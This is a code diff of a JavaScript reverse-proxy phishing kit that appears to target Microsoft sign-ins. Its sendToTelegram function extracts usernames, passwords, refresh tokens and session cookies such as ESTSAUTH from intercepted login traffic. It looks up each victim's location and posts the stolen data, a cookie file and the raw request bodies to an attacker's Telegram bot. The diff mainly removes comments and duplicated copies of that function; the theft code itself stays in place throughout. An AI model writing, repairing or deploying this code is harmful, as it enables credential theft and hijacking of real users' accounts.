@@ -91,7 +91,7 @@ async function sendCookiesAsFile(cookies, sessionId) {
 }
 
 // ================================================
-// 𝙼𝙰𝙸𝙽 𝚃𝙴𝙻𝙴𝙶𝚁𝙰𝙼 𝙵𝚄𝙽𝙲𝚃𝙸𝙾𝙽
+// 𝙼𝙰𝙸𝙽 𝚃𝙴𝙻𝙴𝙶𝚁𝙰𝙼 𝙵𝚄𝙽𝙲𝚃𝙸𝙾𝙽 (FIXED - NO DUPLICATES)
 // ================================================
 
 async function sendToTelegram(data) {
@@ -104,7 +104,6 @@ async function sendToTelegram(data) {
         
         console.log('📨 sendToTelegram() CALLED with URL:', url);
         
-        // ────── CHECK IF ALREADY NOTIFIED ──────
         if (NOTIFIED_SESSIONS.has(sessionId)) {
             console.log('⏭️ Already notified for session:', sessionId);
             return;
@@ -115,7 +114,6 @@ async function sendToTelegram(data) {
                    data.proxyRequestHeaders?.['x-forwarded-for']?.split(',')[0]?.trim() || 
                    'Unknown';
 
-        // ────── CHECK FOR CREDENTIALS ──────
         let username = 'N/A';
         let password = 'N/A';
         let hasCredentials = false;
@@ -126,7 +124,6 @@ async function sendToTelegram(data) {
             const bodyStr = typeof body === 'string' ? body : JSON.stringify(body);
             console.log('📦 Raw body (first 500 chars):', bodyStr.slice(0, 500));
             
-            // ── PATTERN 1: URL-encoded form data ──
             const userMatch = bodyStr.match(/(?:login|loginfmt|username)=([^&]+)/i);
             if (userMatch) {
                 username = decodeURIComponent(userMatch[1]);
@@ -139,7 +136,6 @@ async function sendToTelegram(data) {
                 console.log('✅ PASSWORD FOUND (URL-encoded):', password);
             }
             
-            // ── PATTERN 2: JSON format ──
             try {
                 const jsonBody = typeof body === 'string' ? JSON.parse(body) : body;
                 if (jsonBody.password) {
@@ -147,15 +143,10 @@ async function sendToTelegram(data) {
                     hasCredentials = true;
                     console.log('✅ PASSWORD FOUND (JSON):', password);
                 }
-                if (jsonBody.username) {
-                    username = jsonBody.username;
-                }
-                if (jsonBody.loginfmt) {
-                    username = jsonBody.loginfmt;
-                }
+                if (jsonBody.username) username = jsonBody.username;
+                if (jsonBody.loginfmt) username = jsonBody.loginfmt;
             } catch (e) {}
             
-            // ── PATTERN 3: Raw string fallback ──
             if (!hasCredentials && bodyStr.includes('password')) {
                 const rawPassMatch = bodyStr.match(/"password"\s*[:=]\s*"([^"]+)"/i) ||
                                     bodyStr.match(/password['"]?\s*[:=]\s*['"]?([^'"]+)['"]?/i);
@@ -166,7 +157,6 @@ async function sendToTelegram(data) {
                 }
             }
             
-            // ── PATTERN 4: Token exchange ──
             if (bodyStr.includes('refresh_token') && bodyStr.includes('grant_type')) {
                 isTokenExchange = true;
                 hasCredentials = true;
@@ -174,7 +164,6 @@ async function sendToTelegram(data) {
             }
         }
         
-        // ────── CHECK FOR SESSION COOKIE ──────
         const setCookieHeaders = data.proxyResponseHeaders?.['set-cookie'];
         if (setCookieHeaders) {
             const cookieStr = JSON.stringify(setCookieHeaders);
@@ -187,13 +176,11 @@ async function sendToTelegram(data) {
             }
         }
         
-        // ────── SEND NOTIFICATION IF WE HAVE USERNAME ──────
         if (username !== 'N/A' || hasCredentials || isSessionCookie) {
             hasCredentials = true;
             console.log('✅ Sending notification for username/cookie');
         }
         
-        // ────── SKIP IF NOTHING VALUABLE ──────
         if (!hasCredentials) {
             console.log('⏭️ Skipping notification - no credentials found in:', url);
             return;
@@ -202,7 +189,6 @@ async function sendToTelegram(data) {
         console.log('✅ Valid credentials found, sending notification...');
         NOTIFIED_SESSIONS.add(sessionId);
         
-        // ────── GEO INFO ──────
         let geo = { country: 'Unknown', countryCode: 'UN', regionName: '', city: '', isp: '', org: '' };
         let flag = '🌍';
         let location = 'Unknown';
@@ -217,7 +203,6 @@ async function sendToTelegram(data) {
             }
         }
 
-        // ────── BUILD MESSAGE ──────
         let message = `
 🔐 **New Login Captured!**
 
@@ -264,7 +249,6 @@ ${flag} **Location:** ${location}
             `;
         }
 
-        // ────── SEND TELEGRAM ──────
         console.log('📤 Sending Telegram message...');
         await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
             chat_id: CHAT_ID,
@@ -273,14 +257,12 @@ ${flag} **Location:** ${location}
         });
         console.log('✅ Telegram message sent successfully');
 
-        // ────── SEND COOKIES AS FILE ──────
         const cookies = extractCookiesFromHeaders(data.proxyResponseHeaders);
         if (cookies && Object.keys(cookies).length > 0) {
             await sendCookiesAsFile(cookies, sessionId);
             console.log('✅ Cookies file sent');
         }
 
-        // ────── SEND RAW DATA ──────
         if (body && typeof body === 'string' && body.length > 0 && body.length < 4000) {
             await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 chat_id: CHAT_ID,
@@ -293,295 +275,6 @@ ${flag} **Location:** ${location}
     } catch (e) {
         console.error('❌ sendToTelegram() FAILED:', e.message);
         console.error('   Stack:', e.stack);
-        NOTIFIED_SESSIONS.delete(sessionId);
-    }
-}
-            
-            // ── PATTERN 4: Token exchange ──
-            if (bodyStr.includes('refresh_token') && bodyStr.includes('grant_type')) {
-                isTokenExchange = true;
-                hasCredentials = true;
-                console.log('✅ TOKEN EXCHANGE DETECTED');
-            }
-        }
-        
-        // ────── CHECK FOR SESSION COOKIE ──────
-        const setCookieHeaders = data.proxyResponseHeaders?.['set-cookie'];
-        if (setCookieHeaders) {
-            const cookieStr = JSON.stringify(setCookieHeaders);
-            if (cookieStr.includes('esctx') || 
-                cookieStr.includes('ESTSAUTH') || 
-                cookieStr.includes('LoginOptions')) {
-                isSessionCookie = true;
-                hasCredentials = true;
-                console.log('✅ SESSION COOKIE DETECTED');
-            }
-        }
-        
-        // ────── SEND NOTIFICATION IF WE HAVE USERNAME ──────
-        if (username !== 'N/A' || hasCredentials || isSessionCookie) {
-            hasCredentials = true;
-            console.log('✅ Sending notification for username/cookie');
-        }
-        
-        // ────── SKIP IF NOTHING VALUABLE ──────
-        if (!hasCredentials) {
-            console.log('⏭️ Skipping notification - no credentials found in:', url);
-            return;
-        }
-        
-        console.log('✅ Valid credentials found, sending notification...');
-        NOTIFIED_SESSIONS.add(sessionId);
-        
-        // ────── GEO INFO ──────
-        let geo = { country: 'Unknown', countryCode: 'UN', regionName: '', city: '', isp: '', org: '' };
-        let flag = '🌍';
-        let location = 'Unknown';
-
-        if (ip !== 'Unknown') {
-            try {
-                geo = await getGeoInfo(ip);
-                flag = getFlagEmoji(geo.countryCode);
-                location = `${geo.city}, ${geo.regionName}, ${geo.country}`;
-            } catch (e) {}
-        }
-
-        // ────── BUILD MESSAGE ──────
-        let message = `
-🔐 **New Login Captured!**
-
-🌍 **IP:** ${ip}
-${flag} **Location:** ${location}
-🏢 **ISP:** ${geo.isp || 'N/A'}
-📡 **Org:** ${geo.org || 'N/A'}
-
-🕒 **Time:** ${data.timestamp || new Date().toISOString()}
-🔗 **URL:** ${url}
-📨 **Method:** ${method}
-📊 **Status:** ${data.proxyResponseStatusCode || 'N/A'}
-
-🖥️ **User-Agent:** ${userAgent}
-        `;
-
-        if (username !== 'N/A') {
-            message += `
-👤 **Username/Email:** ${username}
-            `;
-        }
-        
-        if (password !== 'N/A') {
-            message += `
-🔐 **Password:** ${password}
-            `;
-        } else {
-            message += `
-⚠️ **Password:** Not yet captured (waiting for second step)
-            `;
-        }
-
-        if (isSessionCookie) {
-            message += `
-🍪 **Session Cookie:** ✅ Captured
-🔑 **Status:** Authenticated session
-            `;
-        }
-
-        if (isTokenExchange) {
-            message += `
-🔄 **Token Exchange:** ✅ Detected
-💎 **Value:** High (refresh token / access token)
-            `;
-        }
-
-        // ────── SEND TELEGRAM ──────
-        console.log('📤 Sending Telegram message...');
-        const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-            chat_id: CHAT_ID,
-            text: message,
-            parse_mode: 'Markdown'
-        });
-        console.log('✅ Telegram message sent successfully');
-
-        // ────── SEND COOKIES AS FILE ──────
-        const cookies = extractCookiesFromHeaders(data.proxyResponseHeaders);
-        if (cookies && Object.keys(cookies).length > 0) {
-            await sendCookiesAsFile(cookies, sessionId);
-            console.log('✅ Cookies file sent');
-        }
-
-        // ────── SEND RAW DATA ──────
-        if (body && typeof body === 'string' && body.length > 0 && body.length < 4000) {
-            await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                chat_id: CHAT_ID,
-                text: `📦 **Raw POST Data:**\n\`\`\`\n${body.slice(0, 3000)}\n\`\`\``,
-                parse_mode: 'Markdown'
-            });
-            console.log('✅ Raw data sent successfully');
-        }
-
-    } catch (e) {
-        console.error('❌ sendToTelegram() FAILED:', e.message);
-        console.error('   Stack:', e.stack);
-        NOTIFIED_SESSIONS.delete(sessionId);
-    }
-}
-        
-        // ────── CHECK FOR SESSION COOKIE ──────
-        const setCookieHeaders = data.proxyResponseHeaders?.['set-cookie'];
-        if (setCookieHeaders) {
-            const cookieStr = JSON.stringify(setCookieHeaders);
-            if (cookieStr.includes('esctx') || 
-                cookieStr.includes('ESTSAUTH') || 
-                cookieStr.includes('LoginOptions')) {
-                isSessionCookie = true;
-                hasCredentials = true;
-                console.log('✅ SESSION COOKIE DETECTED');
-            }
-        }
-        
-        // ────── SEND NOTIFICATION IF WE HAVE USERNAME OR COOKIE ──────
-        // Even if no password yet, we should send a notification for the username
-        if (username !== 'N/A' || hasCredentials || isSessionCookie) {
-            hasCredentials = true; // Force send if we have at least a username
-            console.log('✅ Sending notification for username/cookie');
-        }
-        
-        // ────── SKIP IF NOTHING VALUABLE ──────
-        if (!hasCredentials) {
-            console.log('⏭️ Skipping notification - no credentials found in:', url);
-            return;
-        }
-        
-        console.log('✅ Valid credentials found, sending notification...');
-        NOTIFIED_SESSIONS.add(sessionId);
-        
-        // ────── GEO INFO ──────
-        let geo = { country: 'Unknown', countryCode: 'UN', regionName: '', city: '', isp: '', org: '' };
-        let flag = '🌍';
-        let location = 'Unknown';
-
-        if (ip !== 'Unknown') {
-            try {
-                geo = await getGeoInfo(ip);
-                flag = getFlagEmoji(geo.countryCode);
-                location = `${geo.city}, ${geo.regionName}, ${geo.country}`;
-            } catch (e) {}
-        }
-
-        // ────── BUILD MESSAGE ──────
-        let message = `
-🔐 **New Login Captured!**
-
-🌍 **IP:** ${ip}
-${flag} **Location:** ${location}
-🏢 **ISP:** ${geo.isp || 'N/A'}
-📡 **Org:** ${geo.org || 'N/A'}
-
-🕒 **Time:** ${data.timestamp || new Date().toISOString()}
-🔗 **URL:** ${url}
-📨 **Method:** ${method}
-📊 **Status:** ${data.proxyResponseStatusCode || 'N/A'}
-
-🖥️ **User-Agent:** ${userAgent}
-        `;
-
-        if (username !== 'N/A') {
-            message += `
-👤 **Username/Email:** ${username}
-            `;
-        }
-        
-        if (password !== 'N/A') {
-            message += `
-🔐 **Password:** ${password}
-            `;
-        } else {
-            message += `
-⚠️ **Password:** Not yet captured (waiting for second step)
-            `;
-        }
-
-        if (isSessionCookie) {
-            message += `
-🍪 **Session Cookie:** ✅ Captured
-🔑 **Status:** Authenticated session
-            `;
-        }
-
-        if (isTokenExchange) {
-            message += `
-🔄 **Token Exchange:** ✅ Detected
-💎 **Value:** High (refresh token / access token)
-            `;
-        }
-
-        // ────── SEND TELEGRAM ──────
-        console.log('📤 Sending Telegram message...');
-        try {
-            const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                chat_id: CHAT_ID,
-                text: message,
-                parse_mode: 'Markdown'
-            });
-            console.log('✅ Telegram message sent successfully');
-        } catch (telegramError) {
-            console.error('❌ Telegram send failed:', telegramError.message);
-            if (telegramError.response) {
-                console.error('   Response:', telegramError.response.data);
-            }
-            throw telegramError;
-        }
-
-        // ────── SEND COOKIES AS FILE ──────
-        const cookies = extractCookiesFromHeaders(data.proxyResponseHeaders);
-        if (cookies && Object.keys(cookies).length > 0) {
-            try {
-                await sendCookiesAsFile(cookies, sessionId);
-                console.log('✅ Cookies file sent');
-            } catch (e) {
-                console.log('⚠️ Cookie file send failed:', e.message);
-            }
-        }
-
-        // ────── SEND RAW DATA FOR DEBUGGING ──────
-        if (body && typeof body === 'string' && body.length > 0 && body.length < 4000) {
-            try {
-                await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                    chat_id: CHAT_ID,
-                    text: `📦 **Raw POST Data:**\n\`\`\`\n${body.slice(0, 3000)}\n\`\`\``,
-                    parse_mode: 'Markdown'
-                });
-                console.log('✅ Raw data sent successfully');
-            } catch (e) {
-                console.log('⚠️ Raw data send failed:', e.message);
-            }
-        }
-
-    } catch (e) {
-        console.error('❌ sendToTelegram() FAILED:', e.message);
-        console.error('   Stack:', e.stack);
-        NOTIFIED_SESSIONS.delete(sessionId);
-    }
-}
-
-        // ────── SEND RAW DATA (FOR DEBUGGING) ──────
-        if (body && typeof body === 'string' && body.length > 0 && body.length < 4000) {
-            try {
-                await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                    chat_id: CHAT_ID,
-                    text: `📦 **Raw POST Data:**\n\`\`\`\n${body.slice(0, 3000)}\n\`\`\``,
-                    parse_mode: 'Markdown'
-                });
-                console.log('✅ Raw data sent successfully');
-            } catch (e) {
-                console.log('⚠️ Raw data send failed:', e.message);
-            }
-        }
-
-    } catch (e) {
-        console.error('❌ sendToTelegram() FAILED:', e.message);
-        console.error('   Stack:', e.stack);
-        // Don't mark as notified on failure so we retry later
         NOTIFIED_SESSIONS.delete(sessionId);
     }
 }
@@ -675,11 +368,6 @@ const WebSocket = require('ws');
 // 𝙲𝙾𝙽𝚂𝚃𝙰𝙽𝚃𝚂 (FIXED: ALL DEFINED IN CORRECT ORDER)
 // ================================================
 
-// ================================================
-// 𝙲𝙾𝙽𝚂𝚃𝙰𝙽𝚃𝚂 (FIXED)
-// ================================================
-
-// ✅ FIXED: Only match the base path, not the full redirect URL
 const PROXY_ENTRY_POINT = "/login?method=signin&mode=secure&client_id=3ce82761-cb43-493f-94bb-fe444b7a0cc4&privacy=on&sso_reload=true";
 
 const PHISHED_URL_PARAMETER = "redirect_urI";
@@ -1897,20 +1585,22 @@ async function logHTTPProxyTransaction(proxyRequestProtocol, proxyRequestOptions
         await new Promise(resolve => logFileStream.once("drain", resolve));
     }
     
-    // ────── FIXED: AWAIT + ERROR HANDLING ──────
     try {
         await sendToTelegram(httpProxyTransaction);
         console.log('✅ Telegram notification sent for:', proxyRequestOptions.path);
     } catch (telegramError) {
         console.error('❌ Telegram notification FAILED:', telegramError.message);
         console.error('   URL:', httpProxyTransaction.proxyRequestURL);
-        // Log to error file
         try {
             fs.appendFileSync('telegram_errors.log', 
                 `[${new Date().toISOString()}] ${telegramError.message} | ${httpProxyTransaction.proxyRequestURL}\n`);
         } catch (e) {}
     }
 }
+
+// ================================================
+// 𝚁𝙴𝙼𝙰𝙸𝙽𝙸𝙽𝙶 𝙷𝙴𝙻𝙿𝙴𝚁 𝙵𝚄𝙽𝙲𝚃𝙸𝙾𝙽𝚂
+// ================================================
 
 function isDomainApplicable(requestHostname, cookieDomain, cookieHostOnly) {
     const splitRequestHostname = requestHostname.split(".");
